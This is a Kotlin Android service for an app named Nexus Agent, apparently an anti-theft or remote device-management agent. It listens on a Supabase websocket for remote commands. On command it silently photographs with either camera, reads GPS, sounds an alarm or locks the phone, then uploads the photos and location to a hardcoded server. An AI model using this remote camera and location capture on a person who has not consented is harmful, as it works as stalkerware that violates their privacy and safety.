package com.inon.nexusagent

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Base64
import androidx.core.app.NotificationCompat
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat as CoreContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class AgentRealtimeService : Service(), LifecycleOwner {

    private var wakeLock: PowerManager.WakeLock? = null
    private val CHANNEL_ID = "NexusRealtimeChannel"
    private var webSocket: WebSocket? = null
    private lateinit var cameraExecutor: ExecutorService
    private var mediaPlayer: MediaPlayer? = null
    
    private val lifecycleRegistry = LifecycleRegistry(this)
    override val lifecycle: Lifecycle get() = lifecycleRegistry

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .build()

    private val supabaseUrl = "https://pqomjgjmuxddunbhzptd.supabase.co"
    private val supabaseKey = "Sb_publishable_A9zsHfvlgv05Ywv0Ji9GYw_17I6ZFVN"

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)

        cameraExecutor = Executors.newSingleThreadExecutor()

        val powerManager = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "NexusAgent::RealtimeWakelock").apply {
            acquire()
        }

        createNotificationChannel()
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Nexus Agent Active")
            .setContentText("מחובר ב-Realtime ל-Supabase")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(1001, notification)
        connectToRealtime()
    }

    private fun connectToRealtime() {
        val prefs = getSharedPreferences("NexusAgentPrefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", "unknown") ?: "unknown"

        val wsUrl = "wss://pqomjgjmuxddunbhzptd.supabase.co/realtime/v1/websocket?apikey=$supabaseKey&vsn=1.0.0"

        val request = Request.Builder()
            .url(wsUrl)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                val joinJson = """
                {
                    "topic": "realtime:public:commands:device_id=eq.$deviceId",
                    "event": "phx_join",
                    "payload": {},
                    "ref": "1"
                }
                """.trimIndent()
                webSocket.send(joinJson)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                if (text.contains("INSERT") || text.contains("UPDATE")) {
                    handleIncomingCommand(text)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                try { Thread.sleep(5000); connectToRealtime() } catch (_: Exception) {}
            }
        })
    }

        private fun handleIncomingCommand(rawJson: String) {
        try {
            val jsonObj = JSONObject(rawJson)
            val record = jsonObj.optJSONObject("payload")?.optJSONObject("record") ?: return
            val action = record.optString("action", "")

            when (action) {
                "PHOTO_FRONT", "front_camera" -> takeCameraSnapshot(true)
                "PHOTO_BACK", "back_camera" -> takeCameraSnapshot(false)
                "GET_LOCATION", "gps_location" -> fetchGpsLocation()
                "PLAY_ALARM", "alarm_on" -> triggerAlarm()
                "STOP_ALARM", "alarm_off" -> stopAlarm()
                "LOCK_DEVICE", "device_lock" -> lockDeviceNow()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    private fun takeCameraSnapshot(isFront: Boolean) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                val cameraSelector = if (isFront) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)

                val photoFile = File(externalCacheDir, "snapshot_${System.currentTimeMillis()}.jpg")
                val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

                imageCapture.takePicture(
                    outputOptions,
                    cameraExecutor,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            uploadResultToSupabase("image_data", photoFile.readBytes())
                            photoFile.delete()
                        }
                        override fun onError(exception: ImageCaptureException) {
                            exception.printStackTrace()
                        }
                    }
                )
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }, CoreContextCompat.getMainExecutor(this))
    }

    @SuppressLint("MissingPermission")
    private fun fetchGpsLocation() {
        try {
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                if (location != null) {
                    val lat = location.latitude
                    val lng = location.longitude
                    val locationStr = "Lat: $lat, Lng: $lng"
                    uploadResultToSupabase("location_data", locationStr.toByteArray())
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun triggerAlarm() {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
            audioManager.setStreamVolume(AudioManager.STREAM_RING, audioManager.getStreamMaxVolume(AudioManager.STREAM_RING), 0)

            if (mediaPlayer == null) {
                val resId = resources.getIdentifier("alarm", "raw", packageName)
                mediaPlayer = if (resId != 0) {
                    MediaPlayer.create(this, resId)
                } else {
                    MediaPlayer.create(this, android.provider.Settings.System.DEFAULT_ALARM_ALERT_URI)
                }
                
                mediaPlayer?.apply {
                    isLooping = true
                    start()
                }
            } else if (!mediaPlayer!!.isPlaying) {
                mediaPlayer!!.start()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopAlarm() {
        try {
            mediaPlayer?.let {
                if (it.isPlaying) {
                    it.stop()
                }
                it.release()
                mediaPlayer = null
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun lockDeviceNow() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun uploadResultToSupabase(columnName: String, dataBytes: ByteArray) {
        try {
            val base64Data = Base64.encodeToString(dataBytes, Base64.NO_WRAP)
            val prefs = getSharedPreferences("NexusAgentPrefs", Context.MODE_PRIVATE)
            val deviceId = prefs.getString("device_id", "unknown") ?: "unknown"

            val jsonBody = JSONObject().apply {
                put("device_id", deviceId)
                put(columnName, base64Data)
                put("created_at", System.currentTimeMillis())
            }

            val body = jsonBody.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder()
                .url("$supabaseUrl/rest/v1/results")
                .addHeader("apikey", supabaseKey)
                .addHeader("Authorization", "Bearer $supabaseKey")
                .addHeader("Content-Type", "application/json")
                .addHeader("Prefer", "return=minimal")
                .post(body)
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: java.io.IOException) { e.printStackTrace() }
                override fun onResponse(call: Call, response: Response) { response.close() }
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Nexus Agent Realtime Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        stopAlarm()
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        webSocket?.close(1000, "Service destroyed")
        wakeLock?.let { if (it.isHeld) it.release() }
        cameraExecutor.shutdown()
        super.onDestroy()
    }
}
